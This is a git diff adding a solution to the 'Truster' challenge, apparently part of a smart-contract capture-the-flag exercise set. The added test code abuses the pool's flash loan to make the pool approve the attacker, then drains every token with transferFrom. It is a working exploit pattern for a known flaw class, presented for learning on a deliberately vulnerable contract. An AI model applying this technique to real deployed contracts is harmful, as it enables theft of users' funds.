@@ -25,6 +25,16 @@ describe("[Challenge] Truster", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        // approve token at target call, pay back flashloan first, then call transferFrom after to drain
+        const callData = this.token.interface.encodeFunctionData("approve", [
+            attacker.address,
+            TOKENS_IN_POOL,
+        ])
+        await this.pool.flashLoan(0, attacker.address, this.token.address, callData)
+        await this.token
+            .connect(attacker)
+            .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
     })
 
     after(async function () {
